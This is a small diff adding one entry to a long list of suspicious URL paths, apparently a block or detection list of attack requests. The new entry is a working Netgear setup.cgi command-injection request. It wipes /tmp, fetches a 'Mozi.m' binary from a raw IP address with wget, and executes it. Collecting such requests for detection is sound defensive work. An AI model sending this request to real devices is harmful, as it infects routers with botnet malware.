@@ -16369,3 +16369,4 @@ http://apiv4.9hits.com/test
 /wp-includes/wp-includes/admin-bar.php
 /nehwwioz.php?Fox=d3wL7
 /components/com_jbusinessdirectory/assets/uploadFile.php
+/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://42.235.71.231:46287/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1
